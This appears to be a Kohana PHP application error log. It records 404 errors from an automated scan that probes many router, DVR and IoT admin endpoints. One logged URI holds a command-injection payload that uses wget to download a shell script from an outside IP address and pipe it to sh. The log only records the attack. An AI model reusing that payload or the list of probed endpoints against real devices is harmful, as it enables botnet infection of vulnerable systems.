#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:55:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:55:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}